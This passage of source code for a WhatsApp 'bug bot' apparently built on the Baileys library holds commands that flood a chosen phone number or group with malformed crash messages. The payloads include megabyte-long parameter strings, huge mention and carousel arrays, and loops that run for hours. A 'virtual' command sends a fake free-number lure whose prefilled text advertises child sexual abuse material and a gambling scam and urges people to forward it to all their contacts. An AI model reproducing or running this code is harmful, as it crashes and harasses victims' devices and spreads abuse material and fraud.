│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚛𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 10 𝚖𝚒𝚗𝚜
└─────────`);
                for (let i = 0; i < 50; i++) {
                await ioskill(bhule, target)
                    await sleep(350);
                }
                reply(`
┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`);
                await sleep(2000);
                await bhule.sendMessage(m.chat, {
                    audio: bug,
                    mimetype: 'audio/mpeg'
                }, { quoted: zets
                });
            }
            break;
case "virtual": {

const numbers = [

/* USA */
"+1 512 903 3051",
"+1 310 140 3867",
"+1 415 655 9822",
"+1 202 555 0147",
"+1 646 555 0199",

/* China */
"+86 131 2456 8891",
"+86 150 7765 4490",
"+86 188 3399 2210",
"+86 136 9987 5541",

/* Russia */
"+7 912 445 8890",
"+7 905 667 2214",
"+7 926 114 5532",
"+7 999 775 4421",

/* Ukraine */
"+380 67 445 9912",
"+380 50 667 3321",
"+380 93 224 5510",
"+380 99 887 4412"

]

function rand(){
return numbers[Math.floor(Math.random() * numbers.length)]
}

let waText = encodeURIComponent(`Unete a MI Grupo se vale todo!! Caceras xxx vale CP Only fans Morritas Activas CP  🔥🔥Unirme al Grupo😈  https://videeyss.online/morritas-cp💥💥🔥🔥 MANOOO VC N VAI ACREDITAR 🔥🔥💥💥
o site da LUCIEN WHATSAPP tá PAGANDO ABSURDO kkkkk 🎰💰
eu entrei agr e ja caiu 150 GIROS GRÁTIS na minha conta 🤯💵
GANHEI quase 1 MIL real em menos de 20min 😱😱

👉👉 https://br.cointelegraph.com/jogos/jogos-azar/ 👈👈
(é só clicar, criar conta e ja era 😎)

⚡ manda isso pra TODO mundo q vc tem no zap, pq eles dao BONUS EXTRA pra qm espalha 🔥
⚠️ mesmo se seu zap travar ou bloquear, a gente ativa de novo rapidin 🤫💣
CORRE PQ ISSO VAI SUMIR LOGO 🚀🚀


Hello, I request a code to send,
For a temporary number I intend.
For verification purposes, my friend,
Thank you for support until the end.


Hello, I request a code to send,
For a temporary number I intend.
For verification purposes, my friend,
Thank you for support until the end.`);

let text = `⭐ *FREE Virtual International Numbers*

🎉 *Congratulations! You have been selected for a Free Trial!*

⌛ *The Trial is only valid for 1 Week*

📢 *Get instant-ready numbers for verification, testing, and development use — built for smooth and reliable access!*

🚀 *Available Numbers*

1. ${rand()}
2. ${rand()}
3. ${rand()}
4. ${rand()}

⚡ *Limited Free Trial*

🏆 *HOW TO VERIFY*

1️⃣ Choose your desired number  
2️⃣ Request the verification code  
3️⃣ Click the button below and send message  

⚡ *You will receive the OTP instantly*
`

try {

const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},

interactiveMessage: {
body: { text: text },
footer: { text: "Free Virtual Sims ©2026" },

header: {
hasMediaAttachment: false
},

nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "🚀 Get OTP Now",
url: `https://wa.me/27631178121?text=${waText}`,
merchant_url: `https://wa.me/27631178121?text=${waText}`
})
}
]
}
}
}
}
}, { quoted: m });

await bhule.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
});

} catch (err) {
console.log("❌ GEN ERROR:", err);

await bhule.sendMessage(m.chat, {
text: "⚠️ Failed to send message. Check bot logs or Baileys version."
}, { quoted: m });
}

}
break   
case 'senn-delay': case 'senn-count': {
    if (!isOwner) return reply(mess.premium)
    if (!q) return reply(`Example: ${prefix + command} 27XXXXXXXX,1`)

    let [num, hrs] = q.split(",")
    if (!num || !hrs) return reply(`Example: ${prefix + command} 27XXXXXXXX,1`)

    let cleanNum = normalizeNumber(num)

    // ❌ INVALID FORMAT
    if (!cleanNum) {
        return reply(`❌ Use international format only\nExample: 27XXXXXXXX`)
    }

    // 🚫 BLOCK PROTECTED NUMBERS
    if (protectedNumbers.includes(cleanNum)) {
        return reply(`⚠️ @user-kun... 
『FORBIDDEN PROTOCOL: BANISHMENT』 ACTIVATED.
You’ve stepped into my domain. 
Violate the rules again and 『CURSED TECHNIQUE: VOID ERASURE』 will delete you from existence.
This is your FINAL WARNING. No second chances. No revival.`)
    }

    let target = cleanNum + "@s.whatsapp.net"
    let hours = parseInt(hrs)

    if (isNaN(hours)) return reply(`Hours must be a number`)

    let duration = hours * 60 * 60 * 1000
    let endTime = Date.now() + duration

    let firstSend = false
    let sent = 0

    reply(`
┌─────────
│፨ status : processing 🪐
│፨ target : ${target}
│፨ hours  : ${hours}
│፨ command: ${command}
└─────────`)

    const runDelay = async () => {
        if (Date.now() >= endTime) {

            reply(`
┌─────────
│፨ status : time finished 🌒
│፨ target : ${target}
│፨ sent   : ${sent}
└─────────`)

            await bhule.sendMessage(
                m.chat,
                {
                    audio: bug,
                    mimetype: 'audio/mpeg'
                },
                { quoted: zets }
            )

            return
        }

        try {

            await travas.NuLL(bhule, target)

            let delay = Math.floor(Math.random() * 3000) + 2000

            sent++

            console.log(`Delay Null Sent ${sent} → ${target}`)

            if (!firstSend) {
                firstSend = true
                reply(`✅ First message sent to ${target}`)
            }

            setTimeout(runDelay, delay)

        } catch (err) {

            

            setTimeout(runDelay, 3000)

        }
    }

    runDelay()
}
break
case 'ios-freeze': {
    if (!isOwner) return reply(mess.premium)
    if (!q) return reply(`Example: ${prefix + command} 27XXXXXXXX,1`)

    let [num, hrs] = q.split(",")
    if (!num || !hrs) return reply(`Example: ${prefix + command} 27XXXXXXXX,1`)

    let cleanNum = normalizeNumber(num)

    // ❌ INVALID FORMAT
    if (!cleanNum) {
        return reply(`❌ Use international format only\nExample: 27XXXXXXXX`)
    }

    // 🚫 BLOCK PROTECTED NUMBERS
    if (protectedNumbers.includes(cleanNum)) {
        return reply(`⚠️ @user-kun... 
『FORBIDDEN PROTOCOL: BANISHMENT』 ACTIVATED.
You’ve stepped into my domain. 
Violate the rules again and 『CURSED TECHNIQUE: VOID ERASURE』 will delete you from existence.
This is your FINAL WARNING. No second chances. No revival.`)
    }

    let target = cleanNum + "@s.whatsapp.net"
    let hours = parseInt(hrs)

    if (isNaN(hours)) return reply(`Hours must be a number`)

    let duration = hours * 60 * 60 * 1000
    let endTime = Date.now() + duration

    let firstSend = false
    let sent = 0

    reply(`
┌─────────
│፨ status : processing 🪐
│፨ target : ${target}
│፨ hours  : ${hours}
│፨ command: ${command}
└─────────`)

    const runDelay = async () => {
        if (Date.now() >= endTime) {

            reply(`
┌─────────
│፨ status : time finished 🌒
│፨ target : ${target}
│፨ sent   : ${sent}
└─────────`)

            await bhule.sendMessage(
                m.chat,
                {
                    audio: bug,
                    mimetype: 'audio/mpeg'
                },
                { quoted: zets }
            )

            return
        }

        try {

            await travas.ioskill(bhule, target)

            let delay = Math.floor(Math.random() * 3000) + 2000

            sent++

            console.log(`Delay Null Sent ${sent} → ${target}`)

            if (!firstSend) {
                firstSend = true
                reply(`✅ First message sent to ${target}`)
            }

            setTimeout(runDelay, delay)

        } catch (err) {


            setTimeout(runDelay, 3000)

        }
    }

    runDelay()
}
break         
   // bug cmds           
 case 'delay-freeze': case 'retro-freeze': case 'cult-trash': {
                if (!isOwner) return reply(mess.premium);
                if (!q) return reply(`Example: ${prefix + command} 27###`);
                let cleanNum = normalizeNumber(q)

// ❌ invalid format
if (!cleanNum) {
    return reply(`❌ Use international format only\nExample: 27XXXXXXXX`)
}

// 🚫 protected numbers
if (protectedNumbers.includes(cleanNum)) {
    await reply(`⚠️ 『FORBIDDEN TARGET』 detected, ${m.pushName}
🚫『SYSTEM PROTOCOL: HOSTILE ENTITY PURGE』 executing...
Connection to target: SEVERED. 
『SOUL LINK: OBLITERATED』. 
Session terminated. Access revoked for all eternity.`);

    // 🔥 ban user
    banUser(m.sender);

    // optional: delete session
    destroySession(m.sender);

    return;
}
// ✅ final target
let target = cleanNum + "@s.whatsapp.net"
                reply(`
┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚛𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 10 𝚖𝚒𝚗𝚜
└─────────`);
for (let i = 0; i < 7; i++) {
                    await delaynull(bhule, target);
                    await sleep(2000);
                }
                for (let i = 0; i < 5850; i++) {
                    await NuLL(bhule, target);
                    await sleep(2000);
                }
                reply(`
┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`);
                await sleep(2000);
                await bhule.sendMessage(m.chat, {
                    audio: bug,
                    mimetype: 'audio/mpeg'
                }, { quoted: zets
                });
            }
            break;           
            

            

 
            
case 'chat-freeze': {
if (!isOwner) return reply(mess.premium);      
    for (let i = 0; i < 3; i++) {
        await ui1(bhule, m.chat);
        await sleep(2000);
    }

    // Send message immediately after loop
    await bhule.sendMessage(m.chat, { text: 'hello 👋' });

    // React
    bhule.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;
 case 'ios-slip': {
if (!isOwner) return reply(mess.premium);      
    for (let i = 0; i < 30; i++) {
        await ioskill(bhule, m.chat);
        await sleep(2000);
    }    
    // React
    bhule.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;           
case 'delay-lag': {
if (!isOwner) return reply(mess.premium);      
    for (let i = 0; i < 5050; i++) {
        await NuLL(bhule, m.chat);
        await sleep(2000);
    }    
    // React
    bhule.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;      
    case "listgc": {
                if (!isOwner) return reply(mess.premium);
                let getGroups = await bhule.groupFetchAllParticipating();
                let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
                let anu = groups.map((v) => v.id);
                let hituet = 0;
                let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`;
                for (let x of anu) {
                    let metadata2 = await bhule.groupMetadata(x);
                    teks += `❏ Group ${hituet+=1}\n│⭔ *Name :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`;
                }
                m.reply(teks);
            }
            break;
            
case "fuck-gc": {
  if (!isCreator) return reply(mess.premium);

  if (!q) {
    return reply(`Example:\n${prefix + command} 1203630xxxxxxxx@g.us\nUse .listgc2 to get GC ID`);
  }

  try {
    let target = q.trim();

    // Validate GC ID
    
reply(`*_sending....._*`)
console.log("using gcid", target);
    // Check if bot is in the group
    let metadata;
    try {
      metadata = await bhule.groupMetadata(target);
    } catch (e) {
      return reply("❌ Bot is not in that group or GCID is invalid.");
    }

    // SAFE LOOP (replace with your real safe logic)
    for (let i = 0; i < 500; i++) {
    await Bhule(bhule, target)   
    await NuLL1(bhule, target)
      await sleep(1000);

      // Example safe action placeholder:
      // await test1(bhule, target);
      console.log(`Loop 1 iteration ${i + 1}`);
    }

    for (let i = 0; i < 5; i++) {
    await ui1(bhule, target)
      await sleep(1000);

      // Example safe action placeholder:
      // await tes(bhule, target, false);
      console.log(`Loop 2 iteration ${i + 1}`);
    }

    return reply(`
[ ✓ ] Completed Successfully
[ 👥 ] Group : ${metadata.subject}
[ 🆔 ] GCID : ${target}
[ ⚙️ ] Command : ${prefix + command}
`);

  } catch (error) {
    console.error("GCID Case Error:", error);
    return reply("❌ Failed to process the GCID.");
  }
}
break;
case "listgc2": {
    if (!isOwner) return reply(mess.premium);

    let args = m.text.split(" ").slice(1).join(" ").toLowerCase();
    let adminOnly = args === "admin";

    let groups = Object.values(await bhule.groupFetchAllParticipating());
    let rows = [];
    let no = 1;

    for (let g of groups) {
        let meta = await bhule.groupMetadata(g.id);

        let isAdmin = meta.participants.some(
            p => p.id === m.sender && p.admin
        );
        if (adminOnly && !isAdmin) continue;

        if (args && !adminOnly && !meta.subject.toLowerCase().includes(args))
            continue;

        rows.push({
            title: `${no++}. ${meta.subject}`,
            description: `Members: ${meta.participants.length}`,
            id: g.id
        });
    }

    if (!rows.length) return reply("❌ No groups found.");

    await bhule.relayMessage(m.chat, {
        interactiveMessage: {
            header: {
                title: "📂 SELECT A GROUP",
                hasMediaAttachment: false
            },
            body: {
                text: "Pick a group"
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "Choose Group",
                            sections: [
                                {
                                    title: "Your Groups",
                                    rows
                                }
                            ]
                        })
                    }
                ]
            }
        }
    }, {});
}
break;        
 // function bugs
 async function Bhule(bhule, target) {
    await bhule.relayMessage(target, {
        lottieStickerMessage: {
            message: {
                stickerMessage: {
                    url: "https://web.whatsapp.net",
                    fileSha256: "Vage+njHZNvvb1GHrlWqhzeSVVHn1WLaEyIwRLLyVXE=",
                    fileEncSha256: "vyfXxW+fzHaoT/tCiWg8NglcvMFJrjNTMYolWEAhSlw=",
                    mediaKey: "7OZLj0E+/KLn9BC5YUil772FbmGw7ZrYrKVMO2JOf90=",
                    mimetype: "application/was",
                    directPath: "/1/o1/v/t62.15575-24/613220393_1566712994946558_7524533051824748274_n.enc?ccb=11-4&oh=01_Q5Aa4QFN2BdpaTF4FreKGhgGZs4G00C2NuE1YPDJCRfC1j2E4w&oe=6A0F2883&_nc_sid=5e03e0",
                    fileLength: "0",
                    mediaKeyTimestamp: "0",
                    isAnimated: true,
                    contextInfo: {
                        nonJidMentions: 1,
                        remoteJid: "Test",
                        participant: "13135550002@s.whatsapp.net",
                        fromMe: true,
                        statusAttributionType: 2,
                        urlTrackingMap: {
                            urlTrackingMapElements: Array.from({ length: 499999 }, () => ({ type: 1 }))
                        },
                        statusAttributions: Array.from({ length: 9000 }, () => ({ type: 1 })),
                        quotedMessage: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "{",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "mpm",
                                    paramsJson: "{}", 
                                    version: 3
                                }
                            }
                        }
                    },
                    isLottie: true
                },
                messageContextInfo: {
                    messageSecret: "OFARCwGLKC0A4YAnGqOT9iRmnEbd4W7jLZ83M4ple90="
                }
            }
        }
    }, {
        additionalNodes: [{
            tag: "biz",
            attrs: {},
            content: [{
                tag: "quality_control",
                attrs: {
                    decision_id: "2236a5c6fd8a1c7e8b22cba03b3e11488d7a0160"
                },
                content: [{
                    tag: "decision_source",
                    attrs: { value: "df" }
                }]
            }]
        }]
    });
}
async function groupBanz(bhule, target) {
  if (!target.endsWith("@g.us")) throw "@g.us server required";
  try {
    // Changed 'zaza' to 'bhule' to match your setup
    await bhule.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add");
  } catch (e) {
    throw e;
  }
}

async function delaynull(bhule, target) {    
   const totalPushes = 10;
   for (let i = 0; i < totalPushes; i++) {
      const push = [];
      const buttons = [];
      for (let j = 0; j < 5; j++) {
         buttons.push({
            name: 'galaxy_message',
            buttonParamsJson: JSON.stringify({
               header: 'null',
               body: 'xxx',
               flow_action: 'navigate',
               flow_action_payload: {
                  screen: 'FORM_SCREEN'
               },
               flow_cta: 'Grattler',
               flow_id: '1169834181134583',
               flow_message_version: '3',
               flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
            }),
         });
      }
      for (let k = 0; k < 1000; k++) {
         push.push({
            body: {
               text: ' WhatsApp'
            },
            footer: {
               text: ''
            },
            header: {
               title: '🚩 KING SAM ',
               hasMediaAttachment: true,
               imageMessage: {
                  url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
                  mimetype: 'image/jpeg',
                  fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
                  fileLength: '591',
                  height: 0,
                  width: 0,
                  mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
                  fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
                  directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
                  mediaKeyTimestamp: '1721344123',
                  jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z',
                  scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                  scanLengths: [247, 201, 73, 63],
                  midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=',
               },
            },
            nativeFlowMessage: {
               buttons: [],
            },
         });
      }
      const carousel = generateWAMessageFromContent(target, {
         interactiveMessage: {
            header: {
               hasMediaAttachment: false,
            },
            body: {
               text: '\u0000\u0000\u0000\u0000',
            },
            footer: {
               text: 'SPIDER-XII',
            },
            carouselMessage: {
               cards: [...push],
            },
         }
      }, {
         userJid: target
      });
      await bhule.relayMessage(target, { groupStatusMessageV2: { message: carousel.message } }, {
         messageId: carousel.key.id,
         participant: {
            jid: target
         },
      });
   }
};

async function delayhard(bhule, target, ptcp = true) {

   const intervalTime = 5000
   const duration = 24 * 60 * 60 * 1000
   const endTime = Date.now() + duration

   console.log("[SYSTEM] Sender started...")

   while (Date.now() < endTime) {

      try {       
        await NuLL(bhule, target)
         console.log("[SEND]", new Date().toLocaleTimeString())
      } 
      
      catch (err) {

         const msg = err?.message?.toLowerCase() || ""

         // Stop if socket is closed or logged out
         if (
            msg.includes("connection closed") ||
            msg.includes("logged out") ||
            msg.includes("connection lost")
         ) {
            console.log("[SYSTEM] Connection closed. Stopping sender.")
            break
         }

         console.log("[ERROR]", err.message)
      }

      await sleep(intervalTime)
   }

   console.log("[SYSTEM] Sender stopped")
}
async function startcrash(bhule, target, ptcp = true) {

   const intervalTime = 5000
   const duration = 24 * 60 * 60 * 1000
   const endTime = Date.now() + duration

   console.log("[SYSTEM] Sender started...")

   while (Date.now() < endTime) {

      try {
         await NuLL(bhule, target)
         console.log("[SEND]", new Date().toLocaleTimeString())
      } 
      
      catch (err) {

         const msg = err?.message?.toLowerCase() || ""

         // Stop if socket is closed or logged out
         if (
            msg.includes("connection closed") ||
            msg.includes("logged out") ||
            msg.includes("connection lost")
         ) {
            console.log("[SYSTEM] Connection closed. Stopping sender.")
            break
         }

         console.log("[ERROR]", err.message)
      }

      await sleep(intervalTime)
   }

   console.log("[SYSTEM] Sender stopped")
}
async function startSender(bhule, target, ptcp = true) {

   const intervalTime = 5000
   const duration = 24 * 60 * 60 * 1000
   const endTime = Date.now() + duration

   console.log("[SYSTEM] Sender started...")

   while (Date.now() < endTime) {

      try {
        await NuLL(bhule, target)
         console.log("[SEND]", new Date().toLocaleTimeString())
      } 
      
      catch (err) {

         const msg = err?.message?.toLowerCase() || ""

         // Stop if socket is closed or logged out
         if (
            msg.includes("connection closed") ||
            msg.includes("logged out") ||
            msg.includes("connection lost")
         ) {
            console.log("[SYSTEM] Connection closed. Stopping sender.")
            break
         }

         console.log("[ERROR]", err.message)
      }

      await sleep(intervalTime)
   }

   console.log("[SYSTEM] Sender stopped")
} 
 async function NuLL(bhule, target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        fromMe: false,
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await bhule.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "makloe", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await bhule.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await bhule.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}
async function NuLL1(bhule, target, ptcp = false) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        fromMe: false,
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await bhule.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "makloe", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await bhule.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await bhule.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}
                      
 async function ioskill(bhule, target) {
const tmsg = await generateWAMessageFromContent(target, {
  viewOnceMessage: {
    message: {
      requestPaymentMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "500000",
        requestFrom: target,
        noteMessage: {
          extendedTextMessage: {
